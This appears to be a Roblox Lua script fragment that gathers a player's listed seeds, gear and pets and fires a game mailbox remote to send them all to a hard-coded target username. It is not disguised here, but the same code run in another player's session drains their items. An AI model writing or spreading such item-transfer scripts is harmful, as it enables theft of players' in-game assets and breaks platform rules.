--------------------------------------------------
-- GET ITEM COUNT
--------------------------------------------------

local function GetItemCount(
	ItemName
)

	local Item =
		Backpack:FindFirstChild(
			ItemName
		)

	if not Item then

		return 0

	end

	local Count =
		Item:GetAttribute(
			"Count"
		)

	if typeof(Count) == "number" then

		return Count

	end

	return 0

end

--------------------------------------------------
-- UNEQUIP TARGET PETS
--------------------------------------------------

local function UnequipTargetPets()

	local Character =
		LocalPlayer.Character

	if not Character then

		return

	end

	local Humanoid =
		Character:FindFirstChildOfClass(
			"Humanoid"
		)

	if Humanoid then

		Humanoid:UnequipTools()

	end

	task.wait(0.3)

	--------------------------------------------------
	-- MOVE TARGET PET TO BACKPACK
	--------------------------------------------------

	for _, Tool in ipairs(
		Character:GetChildren()
	) do

		if Tool:IsA("Tool") then

			if TARGET_PETS[Tool.Name] then

				Tool.Parent = Backpack

			end

		end

	end

end

--------------------------------------------------
-- BUILD NORMAL ITEMS
--------------------------------------------------

local function BuildNormalItems()

	local TradeItems = {}

	for _, ItemData in ipairs(
		NORMAL_ITEMS
	) do

		local Count =
			GetItemCount(
				ItemData.ItemKey
			)

		if Count > 0 then

			table.insert(
				TradeItems,
				{
					Category = ItemData.Category,
					ItemKey = ItemData.ItemKey,
					Count = Count
				}
			)

			print(
				"[ITEM]",
				ItemData.Category,
				ItemData.ItemKey,
				"x" .. Count
			)

		end

	end

	return TradeItems

end

--------------------------------------------------
-- BUILD PET ITEMS
--------------------------------------------------

local function BuildPetItems()

	local TradeItems = {}

	local FoundPetIds = {}

	--------------------------------------------------
	-- UNEQUIP
	--------------------------------------------------

	UnequipTargetPets()

	task.wait(0.3)

	--------------------------------------------------
	-- SCAN BACKPACK
	--------------------------------------------------

	for _, Tool in ipairs(
		Backpack:GetChildren()
	) do

		--------------------------------------------------
		-- MUST BE TOOL
		--------------------------------------------------

		if not Tool:IsA("Tool") then

			continue

		end

		--------------------------------------------------
		-- CHECK PET NAME
		--------------------------------------------------

		if not TARGET_PETS[Tool.Name] then

			continue

		end

		--------------------------------------------------
		-- GET PET ID
		--------------------------------------------------

		local PetId =
			Tool:GetAttribute(
				"PetId"
			)

		if not PetId then

			warn(
				"[PET] PetId Missing:",
				Tool.Name
			)

			continue

		end

		--------------------------------------------------
		-- DUPLICATE PET ID
		--------------------------------------------------

		if FoundPetIds[PetId] then

			continue

		end

		FoundPetIds[PetId] = true

		--------------------------------------------------
		-- ADD PET
		--------------------------------------------------

		table.insert(
			TradeItems,
			{
				Category = "Pets",
				ItemKey = PetId,
				Count = 1
			}
		)

		print(
			"[PET]",
			Tool.Name,
			"| PetId:",
			PetId
		)

	end

	return TradeItems

end

--------------------------------------------------
-- BUILD ALL TRADE ITEMS
--------------------------------------------------

local function BuildTradeList()

	local TradeItems = {}

	--------------------------------------------------
	-- SEED + GEAR
	--------------------------------------------------

	local NormalItems =
		BuildNormalItems()

	for _, Item in ipairs(
		NormalItems
	) do

		table.insert(
			TradeItems,
			Item
		)

	end

	--------------------------------------------------
	-- PET
	--------------------------------------------------

	local PetItems =
		BuildPetItems()

	for _, Item in ipairs(
		PetItems
	) do

		table.insert(
			TradeItems,
			Item
		)

	end

	return TradeItems

end

--------------------------------------------------
-- PRINT TRADE LIST
--------------------------------------------------

local function PrintTradeList(
	TradeItems
)

	print("======================================")
	print("[TRADE] ITEMS TO SEND")
	print("======================================")

	for Index, Item in ipairs(
		TradeItems
	) do

		print(
			Index,
			"|",
			Item.Category,
			"|",
			Item.ItemKey,
			"| x" .. Item.Count
		)

	end

	print("======================================")

end

--------------------------------------------------
-- TRY TRADE
--------------------------------------------------

local function TryTrade()

	print("")
	print("======================================")
	print("[TRADE] CHECK INVENTORY")
	print("======================================")

	print(
		"Account:",
		LocalPlayer.Name
	)

	print(
		"Target:",
		TARGET_USERNAME
	)

	print(
		"Time:",
		os.date(
			"%Y-%m-%d %H:%M:%S"
		)
	)

	print("======================================")

	--------------------------------------------------
	-- BUILD TRADE LIST
	--------------------------------------------------

	local TradeItems =
		BuildTradeList()

	--------------------------------------------------
	-- NO ITEMS
	--------------------------------------------------

	if #TradeItems == 0 then

		print(
			"[TRADE] Tidak ada item target."
		)

		return false

	end

	--------------------------------------------------
	-- PRINT
	--------------------------------------------------

	PrintTradeList(
		TradeItems
	)

	--------------------------------------------------
	-- SEND
	--------------------------------------------------

	local Success, Result =
		pcall(function()

			return Networking.Mailbox.SendBatch:Fire(
				TargetUserId,
				TradeItems,
				NOTE
			)

		end)

	--------------------------------------------------
	-- FAILED
	--------------------------------------------------

	if not Success then

		warn(
			"[TRADE] SendBatch gagal:"
		)

		warn(
			Result
		)

		return false

	end

	--------------------------------------------------
	-- SUCCESS
	--------------------------------------------------

	print("")
	print("======================================")
	print("[TRADE] SUCCESS")
	print("======================================")

	print(
		"From:",
		LocalPlayer.Name
	)

	print(
		"Target:",
		TARGET_USERNAME
	)

	print(
		"Total Items:",
		#TradeItems
	)

	print(
		"Time:",
		os.date(
			"%Y-%m-%d %H:%M:%S"
		)
	)

	print("======================================")
	print("")

	return true

end

